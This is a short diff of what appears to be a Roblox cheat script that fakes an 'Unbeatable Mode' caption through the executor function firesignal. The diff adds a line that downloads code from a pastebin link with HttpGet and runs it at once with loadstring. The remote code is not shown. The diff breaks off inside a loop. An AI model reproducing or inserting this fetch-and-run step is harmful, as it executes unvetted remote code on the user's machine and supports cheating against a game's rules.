@@ -1,5 +1,7 @@
 firesignal(game:GetService("ReplicatedStorage").EntityInfo.Caption.OnClientEvent, 'Unbeatable Mode Actived',true,5)
 local syncConnection; syncConnection = game:GetService("ReplicatedStorage").GameData.LatestRoom:GetPropertyChangedSignal("Value"):Wait()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/6brG9uma"))()
 -- Rebound
 coroutine.wrap(function()
     while true do
